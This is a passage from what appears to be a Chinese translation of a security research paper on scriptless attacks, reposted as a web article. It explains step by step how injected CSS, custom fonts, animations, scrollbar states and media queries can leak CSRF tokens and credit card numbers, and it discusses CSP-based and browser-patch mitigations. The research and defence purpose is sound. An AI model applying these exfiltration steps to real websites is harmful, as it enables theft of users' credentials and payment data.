title="5.电子邮件客户端和即时消息："></a><strong>5.电子邮件客户端和即时消息：</strong></h3><p>如上所述，浏览器的布局引擎通常不是浏览器本身专用的，因为诸如电子邮件客户端和即时消息程序之类的多个工具同样使用可用的HTML呈现引擎来实现其目的。 Mozilla Thunderbird可以作为一个具体的例子来讨论。默认情况下，在此类软件中禁用脚本：<strong>允许在邮件正文中使用JavaScript甚至插件内容的电子邮件客户端可能会导致严重的隐私隐患</strong>。因此，无脚本攻击为攻击者提供了执行恶意代码的潜在方式。</p><p>总之，有很多攻击场景，其中攻击者无法执行脚本，或者受到执行脚本功能的严重限制。</p><h2 id="超越基于脚本的攻击-1"><a href="#超越基于脚本的攻击-1" class="headerlink" title="超越基于脚本的攻击"></a><strong>超越基于脚本的攻击</strong></h2><p>在本节中，我们将讨论在调查与无脚本攻击相关的攻击面时我们开发的攻击的技术细节。正如我们将看到的，无脚本攻击可以提供一个可行的解决方案，然而在上一节中描述的上下文中渗透和窃取敏感信息，绕过许多可用的防御解决方案，例如沙盒Iframe，脚本阻止程序（即NoScript）或客户端XSS过滤器。对于本文的其余部分，我们假设攻击者具有以下功能：</p><p><strong>1.攻击者可以将任意数据注入浏览器呈现的DOM中</strong></p><p>例如Webmail应用程序中的HTML邮件正文。对于鼓励用户贡献内容的现代Web 2.0应用程序，这是一个可行的假设。此外，根据OWASP排名，XSS攻击被列为头号威胁这一事实表明许多Web应用程序中存在注入漏洞。</p><p><strong>2.我们假设脚本完全禁用</strong></p><p>例如，我们的用户安装了NoScript或类似的防御解决方案，防止攻击者进行代码注入和后续执行。请注意，传统的XSS攻击在此设置中是不可行的，因为无法执行JavaScript（或任何其他语言）内容。</p><p>我们借助处理信用卡号的简单Web应用程序来说明我们的攻击 </p><p>它可以与亚马逊网上商店或应用了适合处理或委托信用卡交易的后端的类似网站进行比较。此Web应用程序允许我们在概念验证场景中演示我们的攻击向量。我们专门选择了信用卡号码处理，因为它们只包含16位数字，例如4000 1234 5678 9010.这使我们能够在短时间内泄露信息。请注意，我们的操作也适用于其他攻击情形，我们将举例说明如何使用我们的方法窃取CSRF令牌和其他类型的敏感信息。此外，我们实现了一个<a href="http://html5sec.org/keylogger/">无脚本键盘记录程序</a>，允许远程攻击者捕获在网页上输入的击键，即使禁用了JavaScript（此漏洞也被跟踪为CVE-2011-匿名化）。</p><h3 id="攻击组件"><a href="#攻击组件" class="headerlink" title="攻击组件"></a><strong>攻击组件</strong></h3><p>以下各节中描述的攻击利用了现代用户代理中可用的几种标准浏览器功能，并在HTML和CSS3规范草案中定义。在继续演示它们如何组合以构成工作攻击向量之前，我们列出并简要解释这些功能。<strong>更具体地说，我们展示了如何滥用合法的浏览器功能来泄露内容或建立功能性的侧通道以从Web浏览器获取特定信息。</strong></p><p><strong>我们发现以下浏览器功能是构建攻击的有用构建块：</strong></p><h4 id="1-基于SVG和WOFF的Web字体："><a href="#1-基于SVG和WOFF的Web字体：" class="headerlink" title="1.基于SVG和WOFF的Web字体："></a><strong>1.基于SVG和WOFF的Web字体：</strong></h4><p>HTML和CSS规范建议浏览器供应商为不同的Web字体格式提供支持。<br>其中包括可缩放矢量图形（SVG）字体和Web开放字体格式（WOFF）。我们的攻击使用这些字体并利用其功能来改变显示的网站内容的属性。 SVG字体允许攻击者轻松修改字符和字形表示，更改单个字符的外观以及使其维度多样化。可以简单地使用诸如宽度之类的属性来通过分配“零宽度”来确保某些字符没有尺寸，而其他属性可以具有不同的且受攻击者控制的尺寸。 WOFF结合CSS3允许使用称为自由连字或上下文替代的特征。通过为WOFF字体指定那些，几乎任何长度的任意字符串可以由单个字符表示（再次给出用于最终测量目的的不同尺寸）。</p><h4 id="2-基于CSS的动画："><a href="#2-基于CSS的动画：" class="headerlink" title="2.基于CSS的动画："></a><strong>2.基于CSS的动画：</strong></h4><p>使用基于CSS的动画，可以随着时间的推移更改各种CSS和DOM属性，而无需使用任何脚本代码。允许通过CSS动画进行更改的属性由规范标记为可动画。</p><p>例如，<strong>攻击者可以使用CSS动画来更改包含敏感信息的DOM节点周围的容器的宽度或高度。</strong><br>通过能够缩放容器，可以强制所包含的内容以特定方式对尺寸变化作出反应。一种反应是断线或溢出容器。如果这些行为是可测量的，动画可能会根据特定行为的计时参数导致信息泄漏。</p><h4 id="3-CSS内容属性："><a href="#3-CSS内容属性：" class="headerlink" title="3.CSS内容属性："></a><strong>3.CSS内容属性：</strong></h4><p>CSS允许使用名为content的属性来提取任意属性值，并在所选元素之前，之后或之后显示值。属性值提取可以由属性值函数的use attr触发。对于此功能的良性用例，请考虑以下情况：开发人员希望通过在显示链接后简单地呈现href属性的内容来显示其网站上所有或所选链接的链接URL，但仅限于绝对链接网址。通过使用以下CSS代码，这是可行的：</p><pre><code class="hljs">a[href^=http://]:after&#123;content:attr(href)&#125;</code></pre><p>此强大功能<strong>还可用于提取敏感属性值，如CSRF令牌，密码字段值和类似数据</strong>。随后，可以在属性上下文之外使它们可见。将提取的信息与字体注入相结合，可提供强大的测量杆和侧通道。实际上，这种组合构成了第3.2节和第3.3节中讨论的攻击的重要方面。</p><h4 id="4-CSS媒体查询"><a href="#4-CSS媒体查询" class="headerlink" title="4.CSS媒体查询"></a><strong>4.CSS媒体查询</strong></h4><p>CSS Media Queries为网站开发人员提供了<strong>一种部署依赖于设备的样式表的便捷方式</strong>。用户代理可以使用媒体查询来例如确定访问网站的设备是否具有视口宽度大于300像素的显示器。如果是这种情况，将部署针对更宽屏幕优化的样式表。否则，将选择针对智能手机和通常较小的屏幕和视口进行优化的样式表。清单1中显示的示例代码说明了一般技术;如果访问部署此CSS代码段的网站的设备的视口宽度大于400像素，则背景变为绿色;如果屏幕仅允许较小的视口宽度，则背景将为红色。</p><blockquote><p>请注意，这些不同的组件都是浏览器中的合法和良性功能。只有在组合时，它们才会被滥用以建立辅助渠道并衡量给定网站的特定方面。</p></blockquote><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB1.png" alt="此处输入图片的描述"></p><h3 id="使用Smart-Scrollbars进行基于测量的内容渗透"><a href="#使用Smart-Scrollbars进行基于测量的内容渗透" class="headerlink" title="使用Smart Scrollbars进行基于测量的内容渗透"></a><strong>使用Smart Scrollbars进行基于测量的内容渗透</strong></h3><p>最初，我们决定将我们的分析重点放在基于Webkit的浏览器上，因为这个浏览器布局引擎已经广泛部署。其中包括谷歌Chrome和Safari，这反过来意味着我们涵盖台式电脑，笔记本电脑，iPhone和iPad，以及各种Android浏览器，Blackberry和Tablet OS设备。</p><p>Webkit项目作为开源运行，以非常短的开发周期和快速实现新的W3C和WHATWG功能建议而闻名。除了这些指定和推荐的功能外，Webkit还提供了各种非标准功能，这些功能仅在使用此特定布局引擎的浏览器中提供。</p><p>其中一项专有功能使攻击者能够提供棘手的攻击，对允许提交用户生成的样式的网站起作用。可以提取网站显示的几乎任意信息，包括信用卡号，元素维度等文本内容，甚至HTML&#x2F;XHTML属性值，例如用于保护非幂等HTTP请求的CSRF令牌。一旦使用3.1节中描述的CSS内容功能，后者就成为可能。</p><p>我们开发了一个能够提取CSRF令牌详细信息的演示漏洞;举一个例子，测试显示读取32个字符的CSRF令牌需要少于100个HTTP请求。</p><p>如上所述，CSRF令牌被希望保护可能有害的GET请求的网站使用。如果攻击者可以发现链接以启动对存储项的修改，则可以通过从其他浏览器导航选项卡向该链接发出HTTP请求来完成损害。一个不可思议的链接(应用了长而加密的安全令牌)可以防止这种攻击。必须知道令牌才能成功执行请求。在允许攻击者执行任意JavaScript的攻击场景中，通过简单的DOM遍历到其中一个受保护链接并随后利用侧通道将令牌发送到域外位置以便以后重新使用，很容易提取令牌。但是在我们的攻击场景中，攻击者无法执行JavaScript，因此令牌提取和泄露（除了使用开放的textarea元素和表单提交之外）很复杂。</p><p>Vela等人在2009年使用属性选择器创建了一个示范性的<a href="http://eaea.sirdarckcat.net/cssar/v2/">重载CSS属性读取器</a>。不幸的是，这种方法不适合读取高熵32+字符的CSRF令牌。</p><p>为了实现纯粹的基于CSS的数据泄露攻击，我们利用3.1节中列出的所有可用功能，另外将它们与专有Webkit功能之一相结合。<strong>以下概述介绍了我们从初始CSS注入转移到敏感CSRF令牌的完整堆栈数据泄漏的步骤：</strong></p><ul><li><p>攻击者注入一个包含一组CSS选择器和一个font-face声明的样式元素。这些CSS选择器选择CSRF令牌保护链接（CTPL）及其容器元素。 font-face声明导入一组经过精心准备的SVG字体：对于可出现在CSRF令牌中的每个字符，都会导入一个字体文件。除导入的字体外，任何其他字符的宽度均为零。每个具有宽度的字体的单个特定字符应用具有独特宽度值。</p></li><li><p>CSS动画块与前面提到的CSS一起注入。此动画以CTPL的容器为目标，并将其从初始大尺寸缩小到特定的最终尺寸。确定最终尺寸至关重要;攻击者需要找出动画停止泄漏有关收缩容器所包含内容的信息的正确像素大小。</p></li><li><p>注入的CSS包含由CTPL的:: before伪选择器嵌入的内容属性。此内容属性应用值attr（href）。<br>因此，攻击者可以将href属性的值映射到DOM并使其可见。通过这样做，可以应用注入的SVG字体。对于每次出现的CTPL，都可以选择不同的SVG字体。在第一个选定的链接中，将选择仅为字符a提供维度的字体。对于第二个CTPL出现，将选择仅为字符b提供维度的字体，依此类推。接下来，所有CTPL都可以使用单独的字体，而连接到指定字体的字符的所有CTPL都将没有任何维度。最后，包含由所选字体标注的字符的所有CTPL将具有以像素为单位的字符宽度×出现的维度。</p></li><li><p>通过将CTPL的容器元素的框大小从100％减小到一个像素，攻击者可以唤起一个有趣的行为：该框对于CTPL来说太小了，因此应用维度的字符将突破到下一行。如果该框具有不同的高度且没有水平溢出属性，则会出现滚动条。滚动条出现的那一刻构成攻击者在本地确定正在使用的字符的开口：特定的SVG字体，零宽度字符和通过像素精确动画强制减少框大小的滚动条就足够了。</p></li></ul><p>最终，攻击者可以在本地确定角色是否具有唯一的尺寸，因此存在于CTPL中。无法远程确定此角色的唯一障碍是缺少适用于滚动条的反向通道。没有标准化的方法将背景图像或类似属性应用于滚动条。<br>Webkit  - 所有其他经过测试的浏览器布局引擎中的例外 - 提供此功能。开发人员可以选择窗口或HTML元素滚动条的任何组件，并应用几乎任意的样式。这包括框阴影，圆角边框和背景图像。但是，我们的调查显示，页面加载后会直接请求典型的滚动条背景图像。因此，该属性对于定时目的和侧通道的开发似乎是无趣的，所述侧通道获得关于出现时间或纯粹存在的信息。尽管如此，对Webkit可用伪类和状态选择器的进一步研究揭示了一种工作方式，即将滚动条状态与背景图像结合使用，以实现实际定时和测量攻击。若干状态选择器允许分配背景图像，并且基于该事实，必须实际发生特定状态（诸如影响滚动条轨道的背景的递增滚动）。此时，后台将在进入此CSS选择状态时加载，而不是在页面加载时加载。这允许对手确实使用滚动条外观的测量来进行定时和侧通道数据泄漏。</p><p>清单2中显示的CSS代码示例演示了一个能够作为辅助通道工作的状态选择器。<br>在我们基于Webkit滚动条功能的测试期间，确定敏感内容只需几秒钟。如果执行CSS动画，受害者不一定会注意到恶意性质。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB2.png" alt="此处输入图片的描述"></p><p>我们在http：&#x2F;&#x2F; html5sec上创建了一个公共测试用例。<br>org &#x2F; webkit &#x2F; test在Google Chrome开发团队负责任地披露问题后，展示了这种侧向引导攻击。为了缓解这种攻击，我们建议平等对待滚动条背景和滚动条状态背景;应在页面加载期间加载所有背景图像和类似的外部资源，而不是在外观或状态发生时加载。这两个方面创建了一个攻击窗口，允许侧面信道攻击和外观探测可用于泄漏敏感数据和页面参数，如上文所述的攻击所示。</p><p>将一般攻击技术与在受攻击网站上显示信用卡号的运行示例相连接，注入的字体将为信用卡号的每个数字组提供一个连字。要创建包含强制信用卡号码所需的所有可能数字组的WOFF字体，需要不超过9,999或999,999个不同的连字数量，具体取决于信用卡制造商。然后，每个数字组将具有不同的宽度，因此可以通过确定在缩小尺寸的动画过程期间何时出现滚动条来确定该数字组。我们在示例场景中成功测试了这种方法，发现我们可以可靠地确定和泄露这些信息。</p><h3 id="使用滚动条检测和媒体查询进行内容渗透"><a href="#使用滚动条检测和媒体查询进行内容渗透" class="headerlink" title="使用滚动条检测和媒体查询进行内容渗透"></a><strong>使用滚动条检测和媒体查询进行内容渗透</strong></h3><p>在我们研究Webkit特定滚动条数据泄漏功能的过程中，我们尝试开发一种技术，可以通过标准化功能在任何其他浏览器中完成类似的结果。此外，提取单个字符可能会成为一项持久的任务，对于有效的针对性攻击而言并非最佳。因此，我们的目标是继续研究具有更大影响的攻击技术，与上面提到的相当具体的“智能滚动条”方法相比，总体上更有效，更通用。请注意，如果不深入了解攻击面和可能的影响，以及所涉及的特征和对手，第4节中讨论的有效防御即使不是不可能也是复杂的。</p><p>我们利用前面提到的部署CSS媒体查询的技术来提升基于滚动条的数据泄漏，使其适用于所有现代浏览器。它还有助于分离核心问题，从一个小的实现怪癖转变为代表一个实际的基于设计的安全问题。如3.1节所述，媒体查询允许确定设备的视口大小。</p><p>基于此判断过程，他们部署了各种最有可能优化的CSS文件和规则。要让滚动条成为数据泄漏问题的来源，如3.2节中的上述攻击所述，攻击者需要找出滚动条出现的时间和原因。更具体地说，攻击者可以调整元素直到特定点，并使用滚动条来确定元素是否包含具有不同值的某个其他元素或文本节点。如果滚动条存在与否，CSS Media Queries将帮助推出实际部分。以下步骤演示了如何使用CSS Media Queries检测滚动条存在的详细信息：</p><ul><li><p>一个网站部署了一个嵌入另一个网站的Iframe。恶意准备的CSS注入是此嵌入式网站的一部分。 iframe设置为100％的宽度，因此填充整个嵌入窗口的宽度 - 特征。 iframe的高度可以设置为任意值，具体取决于应泄漏的数据。</p></li><li><p>嵌入网站设置为特定宽度。这将确保，如果Iframe的宽度为100％，嵌入式站点将遵循该宽度并相应地设置其视口尺寸。框架&#x2F;嵌入式网站使用注入的CSS媒体查询来部署两个状态。第一个状态使用与嵌入页面几乎相同的宽度。考虑宽度为430px的框架视口，然后框架网站的第一个媒体查询将侦听设备视口宽度为400px。第二个CSS媒体查询现在将侦听设备视图端口宽度为390px。请注意，一旦Iframe仅将宽度减小十个像素，400px的媒体查询将不再匹配。同时，应激活第二个媒体查询并部署其指定的样式，包括背景图像请求等。</p></li><li><p>下一步，嵌入注入站点的Iframe的高度将会改变。这可以通过CSS动画和特定于Webkit的信息泄漏，在托管Iframe的网站上运行的脚本，或者在攻击者生成弹出窗口或在编辑模式中显示的Iframe的情况下手动调整大小来执行;如果主机站点在编辑模式下显示Iframe，则单击并拖动操作将完成调整大小（考虑用于社交工程的浏览器游戏场景）。</p></li></ul><p>CSS动画仍然是最不可能不需要任何用户交互的情况。一旦Iframe的高度降低，大小更改将强制其内容换行。就其本身而言，这条断开线将生成一个垂直滚动条，该滚动条由注入的溢出行为或简单的窗口默认值强制执行。<br>滚动条将占用大约10-15个像素，从而将视口大小从400减小到390或更小的像素宽度。这将触发第二媒体查询并且可以显示背景图像，并行地泄漏换行的确切位置和时间，滚动条外观以及由此包含的信息的宽度和性质。这最终确定了攻击，并将上述功能与CSS Media Queries的组合分类为另一个潜在的信息泄漏。图1中的屏幕截图说明了这种情况。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB3.png" alt="此处输入图片的描述"></p><p>同样，我们在<a href="http://html5sec.org/scrollbar/test%E4%B8%8A%E5%88%9B%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E5%85%AC%E5%85%B1%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%EF%BC%8C%E4%BB%A5%E6%BC%94%E7%A4%BA%E6%BB%9A%E5%8A%A8%E6%9D%A1%E5%AD%98%E5%9C%A8%E7%9A%84%E6%97%A0%E8%84%9A%E6%9C%AC%E7%A1%AE%E5%AE%9A%E3%80%82%E8%A6%81%E5%90%AF%E5%8A%A8%E6%B5%8B%E8%AF%95%EF%BC%8C%E5%BF%85%E9%A1%BB%E9%A6%96%E5%85%88%E8%B0%83%E6%95%B4%E7%AA%97%E5%8F%A3%E7%9A%84%E5%A4%A7%E5%B0%8F%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BB%A5%E5%B0%86%E5%85%B6%E4%B8%8B%E8%BE%B9%E7%95%8C%E6%8B%96%E5%90%91%E4%B8%8A%E8%BE%B9%E7%95%8C%E7%9A%84%E6%96%B9%E5%BC%8F%E6%89%8B%E5%8A%A8%E5%87%8F%E5%B0%8F%E9%AB%98%E5%BA%A6%E3%80%82%E8%AF%B7%E6%B3%A8%E6%84%8F%EF%BC%8C%E8%BF%99%E5%BD%93%E7%84%B6%E5%8F%AF%E4%BB%A5%E8%B7%A8%E5%9F%9F%E8%87%AA%E5%8A%A8%E5%AE%8C%E6%88%90%E3%80%82">http://html5sec.org/scrollbar/test上创建了一个公共测试用例，以演示滚动条存在的无脚本确定。要启动测试，必须首先调整窗口的大小，然后以将其下边界拖向上边界的方式手动减小高度。请注意，这当然可以跨域自动完成。</a></p><p>要将此攻击技术与我们的运行示例相结合，我们只需使用缩小大小的弹出窗口或iframe来确定何时可见内容大小被削弱并导致滚动条出现。此时，整体视图大小也将减小，并通过让CSS媒体查询通过（例如）背景图像发起HTTP请求来引起侧信道的出现。请注意，这次我们不需要利用定时攻击：媒体查询CSS提供有关滚动条出现的像素宽度的详细信息。将该信息与替换信用卡号的上下文连字的已知不同宽度相结合，可以产生详细且精确的侧通道攻击。</p><h3 id="使用上下文替代建立字典字体"><a href="#使用上下文替代建立字典字体" class="headerlink" title="使用上下文替代建立字典字体"></a><strong>使用上下文替代建立字典字体</strong></h3><p>为了加快在注入的网站上识别和确定特定字符串和子字符串的过程，攻击者可能需要大量不同的字体和请求。上述攻击样本被描述为能够从注入的网站中提取单个字符。为了提高效率，攻击者可以使用SVG和WOFF字体提供的自由选择或上下文替代。通过注入包含数十万个字符串组合的字典的跨域字体，可以大大加快检测过程。</p><p>注意，每个字符串表示的字符信息可以是小的：字体使用矢量图形，并且提供不同宽度的检测特征所需的全部可以由包括两个单个点的路径包含。在一个大小为1兆字节的单个字体文件中，攻击者可以存储大量依赖于所表示字符串性质的上下文备选方案。对于数值的数据泄漏（例如，为了能够泄漏信用卡号或类似信息），攻击字体的尺寸可以更小并且仍然容易发现并表示信用卡号包括的单个块。创建攻击字体所需的工具可免费提供给合法使用;用于创建包含字典的SVG字体，简单的文本编辑器就足够了。将字体压缩为SVGZ（压缩SVG）格式以优化大小需要简单的gzip实现。对于编辑和滥用WOFF字体，<a href="http://fontforge.sourceforge.net/%E4%B8%8A%E6%8F%90%E4%BE%9B%E7%9A%84%E5%85%8D%E8%B4%B9%E5%92%8C%E5%BC%80%E6%94%BEtextttFontForge%E5%B7%A5%E5%85%B7%E5%8F%AF%E4%BB%A5%E5%BE%88%E5%AE%B9%E6%98%93%E5%9C%B0%E4%BD%BF%E7%94%A8%E3%80%82">http://fontforge.sourceforge.net/上提供的免费和开放textttFontForge工具可以很容易地使用。</a></p><p>我们的研究结果表明，字体注入可能会对未来的攻击格局产生积极影响。<br>虽然CSP和NoScript默认防止跨域字体注入，但我们需要监视公共字体API的使用。这是因为它们可能被滥用并提供攻击字体，绕过基于白名单的过滤器和保护工具。<br>通过这样做，他们将破坏用户对Google W ebFonts和TypeKit等提供商的信任，这两者都是免费的Web字体部署服务。</p><h2 id="缓解技术"><a href="#缓解技术" class="headerlink" title="缓解技术"></a><strong>缓解技术</strong></h2><p>在本节中，我们将分析现有的攻击缓解技术，以确定网站所有者和开发人员可以在多大程度上防范无脚本攻击。承认无脚本攻击的广泛可能性（本出版物仅讨论了两种可能更多的攻击变体），我们得出结论，需要多层保护才能有效地和整体地防御基于CSS，SVG和HTML的数据泄漏。</p><h3 id="内容安全策略-CSP"><a href="#内容安全策略-CSP" class="headerlink" title="内容安全策略(CSP)"></a><strong>内容安全策略(CSP)</strong></h3><p>CSP最初由Mozilla开发，现在由W3C Web应用程序安全工作组指定为草案。 CSP的主要目标是通过将至少一个域确定为脚本代码的有效源来缓解跨站点脚本等内容注入漏洞。要实现这一目标，可以使用frame-src或sandbox等指令。举一个例子，在frame-src的情况下，可以让支持用户代理检查哪些帧可以嵌入到网站中。因此，可以在可控制的网站上获得关于允许内容的精细粒度。因此，CSP能够减少恶意代码注入攻击的潜在有害影响。请注意，CSP认为任意样式，内联CSS和Web字体都可能有害，因此提供了匹配规则。</p><p>在我们的无脚本攻击环境中，最好限制基本先决条件，以防止网页（或更确切地说是用户）受到攻击。因此，我们分析了针对我们在本文中介绍的攻击的给定CSP指令。首先，我们发现W3C草案的几乎所有指令，除了用于报告策略违规的指令报告 - uri，都有助于防止网站及其用户受到攻击者的影响。指令default-src强制用户代理执行 - 除了一个例外 - 草案的剩余指令以及指令值的给定默认源。在详细了解default-src影响指令之前，重要的是要知道CSP无法检测到带有脚本或样式表代码的纯注入到易受攻击的Web页面中。因此，只能阻止从外部资源加载的文件的内容。</p><p>这导致能够阻止外部文件中包含的恶意内容。看看我们的攻击表明，至少使用CSP的style-src和img-src来进一步减少攻击面是有意义的。通过使用stylesrc指定受保护Web页面的样式，可以限制对不需要的CSS文件的访问。因此，用于读取DOM节点的基于CSS的动画或CSS内容属性的使用在这种情况下将不再用作攻击工具。这同样适用于img-src;如前所述，SVG文件可用于执行无脚本攻击和拦截事件，击键和类似的用户交互，而无需使用脚本技术。</p><p>因此，建议从其他站点（尤其是其他域）阻止SVG文件，以实现更高级别的安全性。基于我们的示例攻击，我们还建议使用frame-src来限制嵌入帧的资源以及用于限制外部字体源的font-src。</p><p>一旦通过限制外部文件资源来提高安全性的可能性已经明确，我们将留下以下考虑：可以限制受保护站点内可能的攻击向量吗？当我们使用sandbox作为不受default-src控制或设置的指令时，就是这种情况。它根据HTML5沙箱属性值限制可用内容。因此，该指令可用于例如停用脚本的执行;因此，基于JavaScript的攻击将无法运行。什么不被认为是危险的是无脚本代码。在我们的例子中，如果遇到典型的脚本攻击，沙箱会很有帮助。</p><p>总之，我们得出结论，CSP是朝着正确方向迈出的一小步和有益的一步。它特别有助于消除可用的侧通道以及一些攻击向量。在我们在第1节中描述的攻击模型中，CSP因此有助于减轻前提条件1并消除前提条件3.然而，它不足以完全覆盖各种无脚本攻击。我们建议的是增加CSP设置的范围，以便至少有一个选项禁止执行样式表或 - 甚至更好 - 选择样式表属性。</p><p>CSP的报道还有一件事仍然存在：与点击劫持相关的行为。我们在3.3节中讨论的滚动条检测依赖于弹出窗口，以防被攻击的网站使用帧破坏程序。与可用的帧检测和破坏功能相反，现代浏览器中没有可靠的方法来实现弹出窗口和分离视图的相同安全性。因此，在4.2节中，我们提出了针对无脚本攻击和类似威胁的其他保护机制。</p><h3 id="检测分离视图"><a href="#检测分离视图" class="headerlink" title="检测分离视图"></a><strong>检测分离视图</strong></h3><p>我们在第3节中描述的一些攻击可以通过使用Iframe和类似的内容框架技术来利用。然而，通过简单地使用适当的X-Frame-Options标头，网站可以轻松部署防御性测量。知道这种防御技术的攻击者已经开始利用不同的方式利用弹出窗口和分离视图来完成数据泄漏攻击，甚至点击劫持攻击，而不受帧破坏代码和X-Frame-Options的影响头。</p><p>其中一些攻击已在双击劫持标签下进行了记录，而其他技术则涉及将活动内容（如applet）或复制和粘贴操作拖放到跨域的可编辑内容区域中。由于扩展的攻击面，我们要强调的是，就现代浏览器而言，网站没有可行的方法来确定它是否在分离的视图中加载相应的弹出窗口。</p><p>为了解决这个问题，我们为最新版本的Web浏览器Firefox（Nightly14.0a1，截至2012年4月提供）创建了一个补丁，提供了一种可能的解决方案来防止所描述的攻击。该补丁通过两个附加属性扩展了众所周知的DOM窗口对象：isPopup和loadedCrossDomain。这两个属性都由布尔值表示，任何网站都可以随时以只读方式访问。正如命名已经暗示的那样，只有当前DOM窗口对象表示的实际GUI窗口是分离视图时，window.isPopup才为真。同样，仅当跨域加载当前DOM窗口对象时，window.loadedCrossDomain才为true。</p><p>这些功能使网站能够使用简单的JavaScript代码检查自己的状态。</p><p>随后，在不安全的情况下，可以采取适当的对策。例如，网站可以通过限制自身以跨域方式或在iframe内部加载到分离视图中来保护自己免受第3节中描述的攻击。虽然后者已经可以在现代浏览器中开箱即用（通过将X-Frame-Options标题设置为SAMEORIGIN或DENY），但前者不能。幸运的是，我们可以通过Firefox浏览器的自定义扩展轻松实现，如下面的清单3所示。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB4.png" alt="此处输入图片的描述"></p><p>该补丁包含C++类nsGlobalWindow和nsWindowWatcher以及Firefox代码库的nsIDOMWindow和nsIWebBrowserChrome接口中的更改。虽然isPopup属性可以通过检查某个已存在的内部窗口标志直接实现，但loadedCrossDomain属性的引入需要额外的代码。每当网站尝试打开新窗口时，此代码会将调用网站的URI的主机名与要加载的网站的主机名（包括端口）进行比较。如果主机名不同，则设置新引入的内部标志以指示此条件，反之亦然，在相反情况下未设置此标志。因此，如果Firefox浏览器重用已存在的弹出窗口以在弹出模式下显示新网站，则loadedCrossDomain属性也会正确更新。</p><p>允许网站确定是否在分离视图中加载，可以立即缓解多种攻击技术。这包括上述几种无脚本攻击，双击劫持，拖放以及多次复制和粘贴攻击。我们计划与不同的浏览器开发团队讨论这个补丁，并评估几种浏览器如何采用这种技术来保护用户免受攻击。</p><h3 id="其他防御技术"><a href="#其他防御技术" class="headerlink" title="其他防御技术"></a><strong>其他防御技术</strong></h3><p>无脚本的攻击可能发生在过多的变化中，并且通常基于其他良性特征的恶意连接。到目前为止，我们已经详细阐述了如何加强浏览器并为网站所有者提供新的杠杆，以最小的努力加强他们的应用程序。此外，我们通过为图像，字体，CSS和其他资源定义严格的原始策略，通过从不同来源请求数据来潜在地导致信息泄漏，从而阐明了CSP如何帮助防止无脚本攻击。</p><p>Zalewski等。讨论了2011年无脚本攻击的另一个方面，指向悬空开放标签，更具体地说，用于数据泄漏的按钮，文本区域和半开图像src属性等元素。这些攻击简单而有效，需要Web应用程序和最终的HTML过滤技术来应用语法验证并强制执行用户生成的（X）HTML内容的语法有效性。开放的textarea可以轻松地将网站的其余部分转换为其自己的内容，从而泄露敏感数据和CSRF令牌。请注意，通过将点击坐标发送到跨域的任意接收器，即使是图像映射和类似的弃用技术也可用于无脚本数据泄漏。除了前面提到的保护技术和机制之外，经典的HTML内容和语法验证与Zalewski创造的同样重要，它可以防止“后XSS世界”中的攻击。请注意，这是一个类似于我们在本文中检查过的攻击者模型。消除侧通道而不是攻击向量对于解决该特定问题同样更重要。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a><strong>相关工作</strong></h2><p>安全社区的成员已经对Web应用程序的攻击给予了很多关注。我们现在将回顾这一领域的相关工作，并讨论无脚本攻击的新方面和贡献。</p><h3 id="历史嗅探"><a href="#历史嗅探" class="headerlink" title="历史嗅探"></a><strong>历史嗅探</strong></h3><p>从概念的角度来看，基于CSS的浏览器历史嗅探与我们的工作密切相关。该技术使对手能够确定用户过去访问过哪些网站。多年来，历史嗅探记录在几个浏览器错误报告中。该方法已用于不同的攻击场景。在一项实证研究中，Jang等人发现几个热门网站实际上使用这种技术来泄露有关访问者浏览行为的信息。鉴于此攻击媒介的普遍存在，最新版本的常见Web浏览器已实施某些防御措施，以保护用户免受基于CSS的历史嗅探。</p><p>我们也使用CSS作为攻击的一部分，但我们不使用历史嗅探背后的实际概念。更具体地说，我们演示了攻击者如何滥用基于CSS的动画，CSS内容属性和CSSMedia查询来访问和收集特定信息。</p><p>因此，我们的攻击也会对最新版本的流行Web浏览器起作用。必须要注意的是，虽然许多记录的历史嗅探攻击在使用JavaScript来泄露数据时明显更快，但这些攻击也可以仅基于CSS实现，而且没有活动脚本代码，这反过来又根据我们的定义将它们区分为无脚本攻击。</p><h3 id="时间攻击"><a href="#时间攻击" class="headerlink" title="时间攻击"></a><strong>时间攻击</strong></h3><p>Felten和Schneider在网络安全的背景下提供了一种更为一般的历史嗅探攻击形式，他分析了与资源是否被缓存相关的时序差异。在类似的攻击中，Bortz和Boneh展示了如何实现定时攻击以从Web应用程序中恢复私人信息。最近，陈等人。展示了与流行网站相关的不同侧通道泄漏，并且还基于时序信息。在其他领域，定时攻击是一种完善的技术，用于从许多不同类型的系统（例如，OpenSSL，SSH 或虚拟机环境）中泄露信息。</p><p>虽然定时测量被用作本文所述的攻击的一部分，但我们利用其他类型的定时攻击，并使用此一般概念来确定Web浏览器上下文中的特定信息。</p><h3 id="客户端和服务器端XSS检测或预防"><a href="#客户端和服务器端XSS检测或预防" class="headerlink" title="客户端和服务器端XSS检测或预防"></a><strong>客户端和服务器端XSS检测或预防</strong></h3><p>由于其高实用率，XSS攻击已被专门的大量研究所涵盖。我们现在将简要讨论发现和防止此类攻击的不同客户端和服务器端方法。请注意，由于其不同的基本原则，它们在无脚本攻击的情况下的有效性受到限制。<br>贝茨等人研究能够阻止XSS的客户端过滤方法。他们在noXSS，NoScript和IE8 XSS过滤器中发现了缺陷，并且发 